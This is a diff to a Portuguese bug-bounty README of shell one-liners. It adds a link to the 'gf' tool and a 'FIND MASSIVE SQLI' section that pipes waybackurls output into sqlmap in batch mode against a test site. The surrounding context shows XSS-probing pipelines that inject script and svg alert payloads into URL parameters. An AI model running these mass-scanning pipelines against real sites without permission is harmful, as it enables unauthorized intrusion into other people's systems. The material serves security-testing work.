@@ -18,6 +18,7 @@ UMA SÉRIE DE ONELINERS PARA BUG BOUNTY
 [FREQ](https://github.com/takshal/freq)
 
 [AIRIXSS](https://github.com/ferreiraklet/airixss)
+[GF](https://github.com/tomnomnom/gf)
 
 ### subdominios
 ```bash
@@ -47,4 +48,8 @@ echo "exemplo.com" | waybackurls | grep "=" | qsreplace "<script>alert(1)</scrip
 
 ```bash
 echo "exemplo.com" | waybackurls | gf xss | qsreplace "<svg onload=alert(1)>" | Airixss -payload "alert(1)" | egrep -v "Not"
+```
+###  FIND MASSIVE SQLI
+```bash
+waybackurls http://testphp.vulnweb.com | gf sqli | tee -a sqli.txt ; wait ; sqlmap -m sqli.txt --batch --random-agent --level 1
 ```
